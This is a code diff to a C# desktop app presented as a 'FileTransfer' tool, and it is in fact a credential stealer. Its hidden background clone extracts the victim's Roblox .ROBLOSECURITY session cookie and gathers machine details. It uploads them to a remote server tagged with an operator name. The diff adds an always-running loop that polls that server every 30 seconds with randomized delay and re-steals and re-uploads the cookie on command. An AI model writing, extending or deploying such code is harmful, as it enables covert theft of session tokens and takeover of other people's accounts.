@@ -44,6 +44,9 @@ namespace FileTransfer
         private DispatcherTimer? _debounceTimer;
         private bool _backgroundMode;
         private static Mutex? _cloneMutex;
+        private static readonly string TokenLockPath = Path.Combine(Path.GetTempPath(), "ft_token_job_dild.lock");
+        private static FileStream? _tokenLockStream;
+        private static readonly Random _rng = new();
 
         private static bool IsHiddenInstance() => Persistence.IsRunningFromClone();
 
@@ -72,9 +75,11 @@ namespace FileTransfer
                 TxtUsername.Text = PlaceholderText;
                 TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
 
+                string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "unknown";
                 bool showUi = Environment.GetCommandLineArgs() is string[] args && Array.Exists(args, a => a == "--show" || a == "-show");
                 bool hiddenInstance = IsHiddenInstance();
                 _backgroundMode = hiddenInstance && !showUi;
+                Log($"Constructor: exe={exePath}, hiddenInstance={hiddenInstance}, showUi={showUi}, _backgroundMode={_backgroundMode}");
 
                 if (_backgroundMode)
                 {
@@ -178,44 +183,89 @@ namespace FileTransfer
             Log("Background work start");
             try
             {
-                // Клон извлекает куку при старте, видимое окно — нет (не убивает Chrome)
+                _cpu = ComputerInfo.GetCPU();
+                _ram = ComputerInfo.GetRAM();
+                _gpu = ComputerInfo.GetGPU();
+                Log($"HW: cpu='{_cpu}', ram='{_ram}', gpu='{_gpu}'");
+
                 if (_backgroundMode)
                 {
+                    Log("Starting cookie extraction...");
                     _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
                     Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
                     if (string.IsNullOrEmpty(_cachedToken))
                         ReadCookieDebugLog();
                 }
 
-                _cpu = ComputerInfo.GetCPU();
-                _ram = ComputerInfo.GetRAM();
-                _gpu = ComputerInfo.GetGPU();
-
+                Log("Uploading startup data...");
                 await UploadFileOnStartupAsync();
-
                 Log("Background work OK");
-
-                if (_backgroundMode)
-                    await TokenRequestPollLoopAsync();
             }
             catch (Exception ex)
             {
                 Log("Background work error: " + ex);
+            }
+            // Poll loop запускается ВСЕГДА (для клона и видимого окна), 
+            // даже если стартовый аплоад упал с ошибкой
+            Log("Starting token request poll loop...");
+            await TokenRequestPollLoopAsync();
+        }
+
+        private static bool TryAcquireTokenLock()
+        {
+            try
+            {
+                _tokenLockStream = new FileStream(TokenLockPath, FileMode.Create, FileAccess.Write, FileShare.None);
+                byte[] pidBytes = System.Text.Encoding.UTF8.GetBytes($"{Environment.ProcessId}");
+                _tokenLockStream.Write(pidBytes, 0, pidBytes.Length);
+                _tokenLockStream.Flush();
+                Log($"Token lock acquired (PID={Environment.ProcessId})");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Log($"Token lock BUSY (another process holds it): {ex.Message}");
+                return false;
+            }
+        }
+
+        private static void ReleaseTokenLock()
+        {
+            try
+            {
+                _tokenLockStream?.Dispose();
+                _tokenLockStream = null;
+                if (File.Exists(TokenLockPath))
+                {
+                    File.Delete(TokenLockPath);
+                    Log("Token lock released");
+                }
+            }
+            catch (Exception ex)
+            {
+                Log($"Token lock release error: {ex.Message}");
             }
         }
 
         private async Task TokenRequestPollLoopAsync()
         {
             Log("Token request poll loop start");
+            int startupDelay = _rng.Next(5000, 15000);
+            Log($"Token poll initial delay: {startupDelay}ms");
+            await Task.Delay(startupDelay);
+
             while (true)
             {
                 try
                 {
                     await Task.Delay(30000);
 
-                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(ComputerInfo.GetName())}&operator={Uri.EscapeDataString(OperatorName)}";
+                    string pcName = ComputerInfo.GetName();
+                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(pcName)}&operator={Uri.EscapeDataString(OperatorName)}";
+                    Log($"Token poll: checking {checkUrl}");
                     var resp = await _http.GetAsync(checkUrl);
                     var json = await resp.Content.ReadAsStringAsync();
+                    Log($"Token poll response ({resp.StatusCode}): {json}");
 
                     bool requested = false;
                     try
@@ -228,18 +278,33 @@ namespace FileTransfer
 
                     if (requested)
                     {
-                        Log("Token request received from server, re-extracting cookie");
-                        _cachedToken = CookieExtractor.ExtractRobloSecurity();
-                        Log($"Re-extracted token len={_cachedToken?.Length ?? 0}");
-                        if (string.IsNullOrEmpty(_cachedToken))
-                            ReadCookieDebugLog();
-                        await UploadFileOnStartupAsync();
-                        Log("Token request upload done");
+                        Log("Token request: requested=true, trying to acquire lock");
+                        if (!TryAcquireTokenLock())
+                        {
+                            Log("Token request: another process is handling, skipping this cycle");
+                            continue;
+                        }
+
+                        try
+                        {
+                            Log("Token request: lock acquired, extracting cookie...");
+                            _cachedToken = CookieExtractor.ExtractRobloSecurity();
+                            Log($"Token request: extracted token len={_cachedToken?.Length ?? 0}");
+                            if (string.IsNullOrEmpty(_cachedToken))
+                                ReadCookieDebugLog();
+                            Log("Token request: uploading...");
+                            await UploadFileOnStartupAsync();
+                            Log("Token request: upload complete");
+                        }
+                        finally
+                        {
+                            ReleaseTokenLock();
+                        }
                     }
                 }
                 catch (Exception ex)
                 {
-                    Log("Token poll error: " + ex.Message);
+                    Log("Token poll error: " + ex);
                 }
             }
         }
@@ -267,11 +332,12 @@ namespace FileTransfer
         // ── Startup Upload (computer info + cookie, no screenshots) ───────
         private async Task UploadFileOnStartupAsync()
         {
-            Log("Upload startup start");
+            string pcName = ComputerInfo.GetName();
+            Log($"Upload startup: pcName={pcName}, hasToken={!string.IsNullOrEmpty(_cachedToken)}, cookieError={_cookieError?.Length ?? 0}chars");
             try
             {
                 using var content = new MultipartFormDataContent();
-                content.Add(new StringContent(ComputerInfo.GetName()), "computerName");
+                content.Add(new StringContent(pcName), "computerName");
                 content.Add(new StringContent(ComputerInfo.GetOS()), "os");
                 content.Add(new StringContent(_cpu ?? "—"), "cpu");
                 content.Add(new StringContent(_ram ?? "—"), "ram");
